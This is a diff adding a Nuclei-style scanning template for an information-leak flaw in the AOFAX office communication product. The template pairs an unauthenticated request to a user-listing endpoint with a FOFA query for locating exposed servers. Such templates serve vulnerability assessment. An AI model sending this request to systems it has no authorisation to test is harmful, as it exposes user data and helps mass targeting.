@@ -1,0 +1,19 @@
+id: poc-qpq0zkopndyqf39v
+info:
+  name: AOFAX傲发办公通信专家-getuser-信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qpq0zkopndyqf39v'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qpq0zkopndyqf39v
+    fofa: body="getincommingcall"
+http:
+- raw:
+  - GET /handle/user.ashx?type=getuser HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
